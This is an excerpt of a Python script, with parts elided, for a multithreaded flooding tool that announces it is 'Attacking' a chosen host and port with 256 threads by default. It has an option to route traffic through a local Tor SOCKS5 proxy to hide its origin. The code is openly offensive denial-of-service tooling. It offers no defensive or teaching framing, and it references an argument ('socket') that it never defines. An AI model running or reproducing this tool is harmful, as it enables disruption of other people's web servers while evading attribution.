    ...
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", int(socksport))
...
def main(target, threads, port, tor, sport=9050):
    print("Attacking " + target + " on port " + str(port) + " using " + str(threads) + " threads" + " and socks5 proxy " + str(sport))
...
if __name__ == "__main__":
    ...
    parser.add_argument("--target", "-t",
                        help="<Hostname|IP>")
    parser.add_argument("--threads", "-r",
                        help="<Number of threads> Defaults to 256")
    parser.add_argument("--port", "-p",
                        help="<Web Server Port> Defaults to 80")
    parser.add_argument("--tor", "-T",
                        help="Enable anonymising through tor on 127.0.0.1:9050 (or specified SocksPort)",
                        action="store_true")
    ...
    threads = int(args.threads) if args.threads else 256
    port = int(args.port) if args.port else 80
    tor = True if args.tor else False
    socksport = int(args.socket) if args.socket else 9050

    main(target, threads, port, tor, socksport)
